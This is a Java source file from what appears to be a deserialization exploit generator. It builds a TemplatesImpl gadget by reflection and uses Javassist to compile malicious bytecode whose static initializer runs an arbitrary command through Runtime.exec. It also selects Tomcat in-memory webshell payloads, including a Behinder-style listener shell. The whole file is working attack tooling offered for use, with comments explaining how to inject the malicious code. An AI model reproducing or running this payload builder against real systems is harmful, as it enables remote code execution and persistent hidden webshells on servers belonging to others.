package org.util;


import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.memshell.TomcatListenerBehinderByLei;
import org.memshell.TomcatListenerCMD;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.UUID;

public class TemplateUtils {
    public static TemplatesImpl getTemplate(String common) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Class clazz = TemplatesImpl.class.newInstance().getClass();

        if (common.equals("TomcatWsSocketCMD")) {
            // 该if中用于实现无需继承AbstractTranslet类的打法，由于该步骤生成的数据可能较大，故一般不走这个
            Field name = clazz.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(templates,"zzz");

            Reflections.setFieldValue(templates,"_transletIndex",0);
            Field bytecodes = clazz.getDeclaredField("_bytecodes");
            bytecodes.setAccessible(true);

            byte[][] b = {switchClass(common),switchClass("NullClass")};
            bytecodes.set(templates,b);
            Field tfactory = clazz.getDeclaredField("_tfactory");
            tfactory.setAccessible(true);
            tfactory.set(templates, new TransformerFactoryImpl());

            return templates;
        }
        byte[][] targetByteCodes = new byte[][]{switchClass(common)};
        Field[] Fields = clazz.getDeclaredFields();
        for (Field Field : Fields) { //遍历Fields数组
            try {
                Field.setAccessible(true);  //对数组中的每一项实现私有访问
                if (Field.getName() == "_bytecodes") {
                    Field.set(templates, targetByteCodes);
                }
                if (Field.getName() == "_class") {
                    Field.set(templates, null);
                }
                if (Field.getName() == "_name") {
                    Field.set(templates, "abc");
                }
                if (Field.getName() == "_tfactory") {
                    Field.set(templates, new TemplatesImpl());
                }
            } catch (Exception e) {
            }
        }
        return templates;
    }

    public static byte[] switchClass(String common) throws CannotCompileException, NotFoundException, IOException {
        // 在此处增加内存马，根据传入命令-c进行加入
        switch (common) {
            // TomcatListenerBehinderByLei,雷桑的马子配雷桑的改版冰蝎
            case "TomcatListenerBehinderByLei":
                return TomcatListenerBehinderByLei.generateListenerMemShell();
            // TomcatListenerCMD
            case "TomcatListenerCMD":
                return TomcatListenerCMD.generateListenerMemShell();
            // 返回一个空的class,用于实现无需AbstractTranslet的打法
            case "NullClass":
                return nullClass();
            default:
                //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
                UUID uuid = UUID.randomUUID();
                String replace = uuid.toString().replace("-", "");

                ClassPool pool = ClassPool.getDefault();
                CtClass cc = pool.makeClass("a" + replace);
                String cmd = "Runtime.getRuntime().exec(\"" + common + "\");";
                //向静态代码块插入恶意代码，插入到构造函数也可以
                cc.makeClassInitializer().insertBefore(cmd);
                //需设置此项才能实现newinstance，具体原因请看defineTransletClasses和getTransletInstance源码
                cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
                cc.setName("A" + replace);
                byte[] evilbytes = cc.toBytecode();
                return evilbytes;
        }
    }

    public static byte[] nullClass() throws IOException, CannotCompileException {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        String className = "A" + replace;
        CtClass ctClass = pool.makeClass(className);
        return ctClass.toBytecode();
    }
}
